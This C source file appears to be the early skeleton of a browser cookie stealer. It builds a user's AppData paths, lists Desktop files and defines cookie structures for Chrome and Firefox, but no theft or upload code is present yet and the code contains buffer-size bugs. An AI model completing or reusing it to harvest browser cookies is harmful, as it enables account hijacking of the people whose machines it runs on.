/*
@
    - Вecided to rewrite everything,
      because the previous version was awful
      and also some unnecessary things were used.
    - cpp previous version: 
        github.com/vulpes-solis/kuechen-spy
@
*/

#include "main.h"

#include <stdio.h>
#include <dirent.h>
// #include <sqlite3.h>
#include <windows.h>

#ifndef CH_TYPE
#define CH_TYPE 1

#ifndef FF_TYPE
#define FF_TYPE 2

#endif
#endif


int main(void)
{
    char  username[50];
    DWORD username_size = sizeof(username);

    if (!(GetUserName (username, &username_size)))
        return -1;

    uint16_t user_path_size = strlen("C:\\Users\\\\");
    char user_path[username_size + strlen(username)];
    sprintf(user_path, "C:\\Users\\%s\\", username);

    uint16_t local_path_s, roaming_path_s;
    local_path_s   = user_path_size + strlen("AppData\\Local\\");
    roaming_path_s = user_path_size + strlen("AppData\\Roaming\\");

    char roaming_path[roaming_path_s];
    char local_path[local_path_s];

    sprintf(roaming_path, "%sAppData\\Roaming\\", user_path);
    sprintf(local_path, "%sAppData\\Local\\", user_path);

    printf("%s\n", user_path);
    printf("%s\n", roaming_path);
    printf("%s\n", local_path);
 
    char* main_dir[100];
    char path[strlen("C:\\Users\\\\Desktop\\") + strlen(username)];

    sprintf(path, "C:\\Users\\%s\\Desktop\\", username);
    dir_reader(path, main_dir);

    /* 
        For some reason here I do have the SEGFAULT.
        It's because main_dir[i] still exist for some weird shit.
        Need to fix. Obviously need to fix...
    */
    for (int i = 0; main_dir[i]; i++)
        printf("%s\n", main_dir[i]);

    return 0;

    /* Just in test purpouse. */
    cookies_datatype container;

    container.host   = "host";
    container.value  = "value";
    container.b_type = FF_TYPE;

    return 0;
}



/* Reads directory and puts it's files in the array of char*'s.
*/
void dir_reader(const char* directory, char** files)
{
    DIR           *dir;
    struct dirent *entry;

    if ((dir = opendir(directory)) != NULL)
    {
        for (int i = 0; (entry = readdir(dir)) != NULL; i++)
        {
            files[i] = (char *)malloc(sizeof(entry->d_name));
            strcpy(files[i], entry->d_name);
        }
        closedir(dir);
    }

    else
        files[0] = NULL;
}


